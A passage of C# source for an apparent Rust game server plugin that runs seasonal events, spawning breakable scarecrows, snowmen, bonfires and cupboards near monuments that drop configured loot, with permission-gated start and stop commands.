                              //  _.PrintError($"Error #444 Предмет равен null, возможно вы ошиблись в Shortname({Shortname})");
                                _.PrintError($"Error #444 The subject is null, you may have made a mistake in Shortname({Shortname})");
                                return null;
                            }
                        }
                        else
                        {
                            DropItem = ItemManager.CreateByItemID(-996920608, CountItem);
                            DropItem.blueprintTarget = ItemManager.itemList.Find(x => x.shortname == Shortname)?.itemid ?? 0;
                        }
                        if (!String.IsNullOrWhiteSpace(DisplayName))
                            DropItem.name = DisplayName;
                      
                        return DropItem;
                    }
                }
            }
            
            internal class CountSetting
            {
                //[JsonProperty("Минимальное количество")]
                [JsonProperty("Minimum amount")]
                public Int32 MinCount;
               // [JsonProperty("Максимальное количество")]
                [JsonProperty("Maximum amount")]
                public Int32 MaxCount;
            }

           // [JsonProperty("Список доступных монументов (При смене карты они могут меняться в соответствии с наличием")]
            [JsonProperty("List of available monuments (When changing the map, they may change according to availability")]
            public List<Monument> Monuments = new List<Monument>();
            internal class Monument
            {
                public String Name;
                public Vector3 Position;
            }

            public static Configuration GetNewConfiguration()
            {
                return new Configuration
                {
                    UseAlertPlayer = true,
                    CustomAvatar = "0",
                    CustomPrefix = "[IQFestival]",
                    UIAlertUse = false,
                    
                    EventList = new Dictionary<String, EventSetting>
                    {
                        ["halloween"] = new EventSetting
                        {
                            TurnedEvent = true,
                          //  StartMessageEvent = "Мероприятие хэллоуин! На карте будут разбросаны чучела, сломав которые вы сможете получить хэллоуиновский подарок!",
                            StartMessageEvent = "Halloween event! Stuffed animals will be scattered on the map, breaking which you can get a Halloween gift!",
                            MonumentsSpawn = new List<String> { "assets/bundled/prefabs/autospawn/monument/medium/compound.prefab", "assets/bundled/prefabs/autospawn/monument/roadside/supermarket_1.prefab", "assets/bundled/prefabs/autospawn/power substations/small/power_sub_small_2.prefab", "assets/bundled/prefabs/autospawn/monument/roadside/warehouse.prefab" },
                            StartTimeEvent = 30,
                            OnlineStart = 0,
                            DistanceSpawnEntity = 5,
                            SettingEntitys = new EventSetting.SettingEntity
                            {
                                EffectPath = "assets/prefabs/misc/halloween/lootbag/effects/gold_open.prefab",
                                DamageEntity = 10,
                                ShortnameListEntity = new List<String> { "assets/prefabs/misc/halloween/scarecrow/scarecrow.deployed.prefab" },
                                DropItemList = new List<EventSetting.DropItems>
                                {
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "halloween.candy",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 40f,CountSettings = new CountSetting { MinCount = 1, MaxCount = 3 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "halloween.lootbag.medium",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 30f,CountSettings = new CountSetting { MinCount = 1, MaxCount = 3 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "halloween.lootbag.large",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 10f,CountSettings = new CountSetting { MinCount = 1, MaxCount = 3 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "pumpkinbasket",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 80f,CountSettings = new CountSetting { MinCount = 1, MaxCount = 3 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "halloween.lootbag.small",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 55f,CountSettings = new CountSetting { MinCount = 1, MaxCount = 3 } },
                                    },
                                     new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Blueprint,
                                        DisplayName = "",
                                        Shortname = "pistol.python",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 30f,CountSettings = new CountSetting { MinCount = 1, MaxCount = 1 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Blueprint,
                                        DisplayName = "",
                                        Shortname = "rifle.semiauto",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 10f,CountSettings = new CountSetting { MinCount = 1, MaxCount = 1 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Blueprint,
                                        DisplayName = "",
                                        Shortname = "pistol.semiauto",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 50f,CountSettings = new CountSetting { MinCount = 1, MaxCount = 1 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Blueprint,
                                        DisplayName = "",
                                        Shortname = "smg.2",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 65f,CountSettings = new CountSetting { MinCount = 1, MaxCount = 1 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Blueprint,
                                        DisplayName = "",
                                        Shortname = "icepick.salvaged",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 60f,CountSettings = new CountSetting { MinCount = 1, MaxCount = 3 } },
                                    },
                                },
                                CountSettings = new CountSetting
                                {
                                    MinCount = 5,
                                    MaxCount = 15,
                                }
                            }
                        },
                        ["newyear"] = new EventSetting
                        {
                            TurnedEvent = false,
                          //  StartMessageEvent = "Новогоднее настроение!На карте по РТ будут разбросаны снеговики - разбив которые, вы получите ценный приз!",
                            StartMessageEvent = "New Year's mood!Snowmen will be scattered all over the RT on the map - breaking them, you will get a valuable prize!",
                            MonumentsSpawn = new List<String> { "assets/bundled/prefabs/autospawn/monument/medium/compound.prefab" },
                            StartTimeEvent = 60,
                            OnlineStart = 5,
                            DistanceSpawnEntity = 10,
                            SettingEntitys = new EventSetting.SettingEntity
                            {
                                EffectPath = "assets/prefabs/misc/halloween/lootbag/effects/gold_open.prefab",
                                DamageEntity = 10,
                                ShortnameListEntity = new List<String> { "assets/prefabs/misc/xmas/snowman/snowman.deployed.prefab", "assets/prefabs/misc/xmas/xmastree/xmas_tree.deployed.prefab", "assets/prefabs/misc/xmas/lollipop_bundle/giantlollipops.deployed.prefab", "assets/prefabs/misc/xmas/giant_candy_cane/giantcandycane.deployed.prefab" },
                                DropItemList = new List<EventSetting.DropItems>
                                {
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "xmas.present.large",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 30f, CountSettings = new CountSetting { MinCount = 1, MaxCount = 3 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "xmas.present.small",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 40f, CountSettings = new CountSetting { MinCount = 1, MaxCount = 3 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "xmas.present.medium",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 50f, CountSettings = new CountSetting { MinCount = 1, MaxCount = 3 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "coal",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 80f, CountSettings = new CountSetting { MinCount = 1, MaxCount = 1 } },
                                    },
                                },
                                CountSettings = new CountSetting
                                {
                                    MinCount = 10,
                                    MaxCount = 20,
                                }
                            }
                        },
                        ["bonfires"] = new EventSetting
                        {
                            TurnedEvent = false,
                           // StartMessageEvent = "Мероприятие - горящие костры! Сломайте костер и получите случайную пищу для выживания на острове!",
                            StartMessageEvent = "The event is burning bonfires! Break the bonfire and get random food to survive on the island!",
                            MonumentsSpawn = new List<String> { "assets/bundled/prefabs/autospawn/monument/roadside/supermarket_1.prefab" },
                            StartTimeEvent = 60,
                            OnlineStart = 5,
                            DistanceSpawnEntity = 10,
                            SettingEntitys = new EventSetting.SettingEntity
                            {
                                EffectPath = "assets/prefabs/misc/halloween/lootbag/effects/gold_open.prefab",
                                DamageEntity = 5,
                                ShortnameListEntity = new List<String> { "assets/prefabs/misc/halloween/skull_fire_pit/skull_fire_pit.prefab" },
                                DropItemList = new List<EventSetting.DropItems>
                                {
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "chicken.cooked",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 30f, CountSettings = new CountSetting { MinCount = 1, MaxCount = 3 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "deermeat.cooked",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 40f, CountSettings = new CountSetting { MinCount = 1, MaxCount = 3 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "bearmeat.cooked",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 50f, CountSettings = new CountSetting { MinCount = 1, MaxCount = 3 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "horsemeat.cooked",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 80f, CountSettings = new CountSetting { MinCount = 1, MaxCount = 1 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "horsemeat.burned",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 55f, CountSettings = new CountSetting { MinCount = 1, MaxCount = 1 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "deermeat.burned",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 44f, CountSettings = new CountSetting { MinCount = 1, MaxCount = 1 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "chicken.burned",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 33f, CountSettings = new CountSetting { MinCount = 1, MaxCount = 1 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "fish.cooked",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 65f, CountSettings = new CountSetting { MinCount = 1, MaxCount = 1 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "humanmeat.burned",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 10f, CountSettings = new CountSetting { MinCount = 1, MaxCount = 1 } },
                                    },
                                },
                                CountSettings = new CountSetting
                                {
                                    MinCount = 10,
                                    MaxCount = 20,
                                }
                            }
                        },
                        ["cupboard"] = new EventSetting
                        {
                            TurnedEvent = true,
                           // StartMessageEvent = "Мероприятие - шкафы удачи! Сломайте шкафы разбросанные возле супермаркетов и получите случайные предметы!",
                            StartMessageEvent = "Event - cabinets of good luck! Break the cabinets scattered near supermarkets and get random items!",
                            MonumentsSpawn = new List<String> { "assets/bundled/prefabs/autospawn/monument/roadside/supermarket_1.prefab" },
                            StartTimeEvent = 60,
                            OnlineStart = 5,
                            DistanceSpawnEntity = 30,
                            SettingEntitys = new EventSetting.SettingEntity
                            {
                                EffectPath = "assets/prefabs/misc/halloween/lootbag/effects/gold_open.prefab",
                                DamageEntity = 30,
                                ShortnameListEntity = new List<String> { "assets/prefabs/deployable/tool cupboard/cupboard.tool.deployed.prefab" },
                                DropItemList = new List<EventSetting.DropItems>
                                {
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "cloth",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 50f, CountSettings = new CountSetting { MinCount = 15, MaxCount = 50 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "stones",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 30f, CountSettings = new CountSetting { MinCount = 15, MaxCount = 3000 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "wood",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 90f, CountSettings = new CountSetting { MinCount = 300, MaxCount = 5000 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "metal.fragments",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 30f, CountSettings = new CountSetting { MinCount = 15, MaxCount = 1000 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "sulfur.ore",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 20f, CountSettings = new CountSetting { MinCount = 15, MaxCount = 800 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "sulfur",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 10f, CountSettings = new CountSetting { MinCount = 15, MaxCount = 500 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "metal.ore",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 50f, CountSettings = new CountSetting { MinCount = 15, MaxCount = 5000 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "charcoal",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 80f, CountSettings = new CountSetting { MinCount = 15, MaxCount = 5000 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "cctv.camera",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 50f, CountSettings = new CountSetting { MinCount = 1, MaxCount = 5 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "fat.animal",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 90f, CountSettings = new CountSetting { MinCount = 15, MaxCount = 500 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "scrap",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 50f, CountSettings = new CountSetting { MinCount = 15, MaxCount = 150 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "targeting.computer",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 60f, CountSettings = new CountSetting { MinCount = 3, MaxCount = 6 } },
                                    },
                                    new EventSetting.DropItems
                                    {
                                        TypeItem = ItemType.Item,
                                        DisplayName = "",
                                        Shortname = "metal.refined",
                                        SkinID = 0,
                                        DropsSetting = new EventSetting.DropItems.DropSettings { RareDrop = 10f, CountSettings = new CountSetting { MinCount = 1, MaxCount = 30 } },
                                    },
                                },
                                CountSettings = new CountSetting
                                {
                                    MinCount = 10,
                                    MaxCount = 20,
                                }
                            }
                        }
                    }
                };
            }
        }

        protected override void LoadConfig()
        {
            base.LoadConfig();
            try
            {
                config = Config.ReadObject<Configuration>();
                if (config == null) LoadDefaultConfig();
                NextTick(SaveConfig);
            }
            catch(Exception ex)
            {///
              //  PrintWarning("Ошибка #444" + $"чтения конфигурации 'oxide/config/{Name}', создаём новую конфигурацию!! | Error #444" + $" reading the configuration 'oxide/config/{Name}', creating a new configuration!!\n\n{ex}");
                PrintWarning("Error #444" + $" reading the configuration 'oxide/config/{Name}', creating a new configuration!!\n\n{ex}");
                LoadDefaultConfig();
            }
        }

        protected override void LoadDefaultConfig() => config = Configuration.GetNewConfiguration();
        protected override void SaveConfig() => Config.WriteObject(config);

        #endregion

        #region Hooks
        void OnServerInitialized()
        {
            _ = this;

            config.Monuments.Clear();
            MonumentInfo[] MonumentsMap = UnityEngine.GameObject.FindObjectsOfType<MonumentInfo>();
            foreach (MonumentInfo MInfo in MonumentsMap)
                config.Monuments.Add(new Configuration.Monument { Name = MInfo.name, Position = MInfo.transform.position });

            SaveConfig();
                        
            foreach (var Event in config.EventList.Where(e => e.Value != null && e.Value.TurnedEvent == true))
                timer.Once(Event.Value.StartTimeEvent, () => {
                    if (!RoutineList.ContainsKey(Event.Key))
                        RoutineList.Add(Event.Key, ServerMgr.Instance.StartCoroutine(StartEvent(Event.Key)));
                });

            RegisteredPermissions();
        }

        void OnEntityDeath(BaseEntity entity, HitInfo info)
        {
            if (entity == null || info == null || entity.IsDestroyed || !EffectsComponent.ContainsKey(entity)) return;
            EffectsComponent[entity].DropItems(entity.transform.position);
        }

         private object OnEntityTakeDamage(BaseCombatEntity entity, HitInfo info)
         {
            if (entity == null || info == null || entity.IsDestroyed || !EffectsComponent.ContainsKey(entity.GetEntity())) return null;
            EffectComponent Component = EffectsComponent[entity.GetEntity()];///entity.GetEntity().GetComponent<EffectComponent>();
            if (Component == null) return null;

            Single Damage = info.damageTypes.Total() * config.EventList[Component.EventKey].SettingEntitys.DamageEntity;
            Single NewHealth = entity.health -= Damage;

            if (NewHealth > 0)
            {
                entity.OnHealthChanged(entity.health, NewHealth);
                entity.SendNetworkUpdateImmediate();
            }
            else entity.Die(info);
            return false;
         }

        void Unload()
        {
            DestroyAll<EffectComponent>();

            foreach (var RList in RoutineList.Where(x => x.Value != null))
                ServerMgr.Instance.StopCoroutine(RList.Value);

            _ = null;
            RoutineList.Clear();
            RoutineList = null;
            EventStarted.Clear();
            EventStarted = null;
        }

        #endregion

        #region Metods
        void RegisteredPermissions()
        {
            permission.RegisterPermission(PermissionStartEvent, this);
            permission.RegisterPermission(PermissionStopEvent, this);
            PrintWarning("Permissions - completed");
        }
        static float GetGroundPosition(Vector3 pos)
        {
            float y = TerrainMeta.HeightMap.GetHeight(pos);
            RaycastHit hit;
            if (Physics.Raycast(new Vector3(pos.x, pos.y + 50f, pos.z), Vector3.down, out hit, Mathf.Infinity, LayerMask.GetMask(new[] { "Terrain", "World", "Default", "Construction", "Deployed" })) && !hit.collider.name.Contains("rock_cliff"))
                return Mathf.Max(hit.point.y, y);
            return y;
        }

        static Vector3 RandomCircle(Vector3 center, float radius = 2)
        {
            Vector3 pos;
            pos.x = center.x + UnityEngine.Random.Range(-radius, radius);
            pos.z = center.z + UnityEngine.Random.Range(-radius, radius);
            pos.y = center.y;
            pos.y = GetGroundPosition(pos);
            return pos;
        }

        private IEnumerator StartEvent(String KeyEvent)
        {
            if (!config.EventList.ContainsKey(KeyEvent)) yield break;

            EndEvent(KeyEvent);

            if (config.EventList[KeyEvent].OnlineStart > BasePlayer.activePlayerList.Count)
            {
                if (RoutineList.ContainsKey(KeyEvent) && RoutineList[KeyEvent] != null)
                {
                    ServerMgr.Instance.StopCoroutine(RoutineList[KeyEvent]);
                    RoutineList.Remove(KeyEvent);
                }

                timer.Once(config.EventList[KeyEvent].StartTimeEvent, () => {
                    if (!RoutineList.ContainsKey(KeyEvent))
                        RoutineList.Add(KeyEvent, ServerMgr.Instance.StartCoroutine(StartEvent(KeyEvent)));
                });

                yield break;
            }

            if (!EventStarted.ContainsKey(KeyEvent))
                EventStarted.Add(KeyEvent, new List<BaseEntity> { });

            Configuration.EventSetting Event = config.EventList[KeyEvent];

            if (config.UseAlertPlayer)
                foreach (BasePlayer player in BasePlayer.activePlayerList)
                    SendChat(Event.StartMessageEvent, player);

            foreach (Configuration.Monument MonumentSpawn in config.Monuments.Where(m => Event.MonumentsSpawn.Contains(m.Name)))
            {
                yield return CoroutineEx.waitForSeconds(0.1f);

                Int32 CountSpawn = UnityEngine.Random.Range(Event.SettingEntitys.CountSettings.MinCount, Event.SettingEntitys.CountSettings.MaxCount);
                Configuration.EventSetting.SettingEntity SettingEntity = Event.SettingEntitys;
                if (SettingEntity == null) yield break;

                for (Int32 i = 0; i < CountSpawn; i++)
                {
                    yield return CoroutineEx.waitForSeconds(0.1f);

                    Vector3 CirclePosition = RandomCircle(MonumentSpawn.Position, 40);
                    if (TerrainMeta.HeightMap.GetHeight(CirclePosition) + 10 < CirclePosition.y || EventStarted[KeyEvent].Where(p => p != null && Vector3.Distance(p.transform.position, CirclePosition) < Event.DistanceSpawnEntity).Count() > 0)
                    {
                        i--;
                        continue;
                    }
                    String EntityShortname = SettingEntity.ShortnameListEntity.GetRandom();
                    if (String.IsNullOrWhiteSpace(EntityShortname)) continue;

                    BaseEntity Entity = GameManager.server.CreateEntity(EntityShortname, CirclePosition, new Quaternion());

                    Entity.enableSaving = false;
                    if(Entity is StorageContainer || Entity is LootContainer)
                    {
                        Entity.SetFlag(BaseEntity.Flags.Busy, true);
                        Entity.SetFlag(BaseEntity.Flags.Locked, true);
                    }
                    if(Entity is BaseOven)
                    {
                        Entity.SetFlag(BaseEntity.Flags.On, true);
                        Entity.SetFlag(BaseEntity.Flags.OnFire, true);
                    }
  
                    Entity.Spawn();

                    if (Entity != null)
                    {
                        EffectComponent Effect = Entity.gameObject.AddComponent<EffectComponent>();
                        Effect.Initialize(KeyEvent);
                        if (!EffectsComponent.ContainsKey(Entity))
                            EffectsComponent.Add(Entity, Effect);
                        EventStarted[KeyEvent].Add(Entity);
                    }
                }
            }

            timer.Once(Event.StartTimeEvent, () => {
                if (RoutineList.ContainsKey(KeyEvent))
                    EndEvent(KeyEvent);

                RoutineList.Add(KeyEvent, ServerMgr.Instance.StartCoroutine(StartEvent(KeyEvent)));
            });
            yield break;
        }
        void EndEvent(String EventKey)
        {
            if (!EventStarted.ContainsKey(EventKey) || !config.EventList.ContainsKey(EventKey)) return;

            foreach (BaseEntity entity in EventStarted[EventKey].Where(entity => entity != null && !entity.IsDestroyed))
                entity.Kill();

            if (RoutineList.ContainsKey(EventKey))
            {
                ServerMgr.Instance.StopCoroutine(RoutineList[EventKey]);
                RoutineList.Remove(EventKey);
            }
            EventStarted.Remove(EventKey);
        }
        #endregion

        #region Command

        [ChatCommand("iqfe")]
        void CommandIQFEChat(BasePlayer player, String cmd, String[] arg)
        {
            if (arg == null || arg.Length < 2)
            {
                if (player != null)
                    SendChat(GetLang("COMMAND_START_ERROR_SYNTAX", player.UserIDString), player);
                else Puts(GetLang("COMMAND_START_ERROR_SYNTAX", null));
                return;
            }

            String Action = arg[0];
            String KeyEvent = arg[1];
            if(String.IsNullOrWhiteSpace(KeyEvent) || !config.EventList.ContainsKey(KeyEvent))
            {
                if (player != null)
                    SendChat(GetLang("COMMAND_ERROR_KEY", player.UserIDString, KeyEvent), player);
                else Puts(GetLang("COMMAND_ERROR_KEY", null, KeyEvent));
                return;
            }

            switch(Action)
            {
                case "start":
                    {
                        StartEventUser(player, KeyEvent);
                        break;
                    }
                case "stop":
                    {
                        StopEventUser(player, KeyEvent);
                        break;

                    }
            }
        }

        [ConsoleCommand("iqfe")]
        void CommandIQFEConsole(ConsoleSystem.Arg arg)
        {
            BasePlayer player = arg.Player();
            if (arg.Args == null || arg.Args.Length < 2)
            {
                if (player != null)
                    SendChat(GetLang("COMMAND_START_ERROR_SYNTAX", player.UserIDString), player);
                else Puts(GetLang("COMMAND_START_ERROR_SYNTAX", null));
                return;
            }

            String Action = arg.Args[0];
            String KeyEvent = arg.Args[1];
            if (String.IsNullOrWhiteSpace(KeyEvent) || !config.EventList.ContainsKey(KeyEvent))
            {
                if (player != null)
                    SendChat(GetLang("COMMAND_ERROR_KEY", player.UserIDString, KeyEvent), player);
                else Puts(GetLang("COMMAND_ERROR_KEY", null, KeyEvent));
                return;
            }

            switch (Action)
            {
                case "start":
                    {
                        StartEventUser(player, KeyEvent);
                        break;
                    }
                case "stop":
                    {
                        StopEventUser(player, KeyEvent);
                        break;

                    }
            }
        }


        private void StartEventUser(BasePlayer player, String KeyEvent)
        {
            if (player != null && !permission.UserHasPermission(player.UserIDString, PermissionStartEvent))
            {
                SendChat(GetLang("COMMAND_NOT_PERMISSIONS", player.UserIDString), player);
                return;
            }

            if (!RoutineList.ContainsKey(KeyEvent))
                RoutineList.Add(KeyEvent, ServerMgr.Instance.StartCoroutine(StartEvent(KeyEvent)));
            else
            {
                if (!EventStarted.ContainsKey(KeyEvent))
                {
                    if (player != null)
                        SendChat(GetLang("COMMAND_STOP_ERROR_NOT_STARTED", player.UserIDString, KeyEvent), player);
                    else Puts(GetLang("COMMAND_STOP_ERROR_NOT_STARTED", null, KeyEvent));
                    return;
                }
                EndEvent(KeyEvent);
                StartEventUser(player, KeyEvent);
                return;
            }

            if (player != null)
                SendChat(GetLang("COMMAND_START_SUCCESS", player.UserIDString, KeyEvent), player);
            else Puts(GetLang("COMMAND_START_SUCCESS", null, KeyEvent));
        }

        private void StopEventUser(BasePlayer player, String KeyEvent)
        {
            if (player != null && !permission.UserHasPermission(player.UserIDString, PermissionStopEvent))
            {
                SendChat(GetLang("COMMAND_NOT_PERMISSIONS", player.UserIDString), player);
                return;
            }

            if (!EventStarted.ContainsKey(KeyEvent))
            {
                if (player != null)
                    SendChat(GetLang("COMMAND_STOP_ERROR_NOT_STARTED", player.UserIDString, KeyEvent), player);
                else Puts(GetLang("COMMAND_STOP_ERROR_NOT_STARTED", null, KeyEvent));
                return;
            }

            EndEvent(KeyEvent);

            timer.Once(config.EventList[KeyEvent].StartTimeEvent, () => {
                if (!RoutineList.ContainsKey(KeyEvent))
                    RoutineList.Add(KeyEvent, ServerMgr.Instance.StartCoroutine(StartEvent(KeyEvent)));
            });

            if (player != null)
                SendChat(GetLang("COMMAND_STOP_SUCCESS", player.UserIDString, KeyEvent), player);
            else Puts(GetLang("COMMAND_STOP_SUCCESS", null, KeyEvent));
        }
        #endregion

        #region Script
        public class EffectComponent : FacepunchBehaviour
        {
            public String EventKey;
            private String EffectPath;
            private BaseEntity entity;

            void Awake() => entity = GetComponent<BaseEntity>();

            public void Initialize(String EventKey)
            {
                this.EventKey = EventKey;

                Configuration.EventSetting Event = config.EventList[EventKey];
                if (Event == null) return;

                this.EffectPath = Event.SettingEntitys.EffectPath;

                if (!String.IsNullOrWhiteSpace(EffectPath) && entity != null)
                    InvokeRepeating(nameof(EffectSpawn), 0, 30f);
            }

            void EffectSpawn()
            {
                if (entity == null) return;
                Effect.server.Run(EffectPath, entity.CenterPoint() + new Vector3(0, 1f, 0));
            }

            public void DropItems(Vector3 DropPosition)
            {
                if (!config.EventList.ContainsKey(EventKey)) return;
                Configuration.EventSetting Event = config.EventList[EventKey];
                if (Event == null) return;
                if (Event.SettingEntitys.DropItemList == null) return;

                var RandomReward = Event.SettingEntitys.DropItemList.Where(x => UnityEngine.Random.Range(0, 101) <= x.DropsSetting.RareDrop).ToList();
                if (RandomReward == null) return;

                Configuration.EventSetting.DropItems DropItem = RandomReward.GetRandom();
                if (DropItem == null) return;

                Item item = DropItem.CrateItem();
                if (item == null) return;

                item.DropAndTossUpwards(DropPosition + Vector3.up);
            }

            void OnDestroy()
            {
                CancelInvoke(nameof(EffectSpawn));
                if (entity != null && !entity.IsDestroyed)
                    entity.Kill();
                Destroy(this);
            }
        }
        private void DestroyAll<T>()
        {
            var objects = UnityEngine.Object.FindObjectsOfType(typeof(T));
            objects?.ToList().ForEach(UnityEngine.Object.Destroy);
        }
        #endregion

        #region Lang

        private StringBuilder sb = new StringBuilder();
        public string GetLang(string LangKey, string userID = null, params object[] args)
        {
            sb.Clear();
            if (args != null)
            {
                sb.AppendFormat(lang.GetMessage(LangKey, this, userID), args);
                return sb.ToString();
            }
            return lang.GetMessage(LangKey, this, userID);
        }
        private new void LoadDefaultMessages()
        {
            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["COMMAND_START_ERROR_SYNTAX"] = "You made a mistake in the syntax of the command, use the command - info start Key",
                ["COMMAND_STOP_ERROR_SYNTAX"] = "You made a mistake in the syntax of the command, use the command - info stop Key",
                ["COMMAND_ERROR_KEY"] = "The key you entered : {0} - does not exist",
                ["COMMAND_START_SUCCESS"] = "You have successfully launched an event with the key {0}",
                ["COMMAND_STOP_SUCCESS"] = "You have successfully stopped the event with the key {0}}",
                ["COMMAND_STOP_ERROR_NOT_STARTED"] = "The event with the key {0} has not been launched yet",
                ["COMMAND_NOT_PERMISSIONS"] = "The event with the key {0} has not been launched yet",
                ["COMMAND_NOT_PERMISSIONS"] = "You don't have enough rights to use this command",
            }, this);
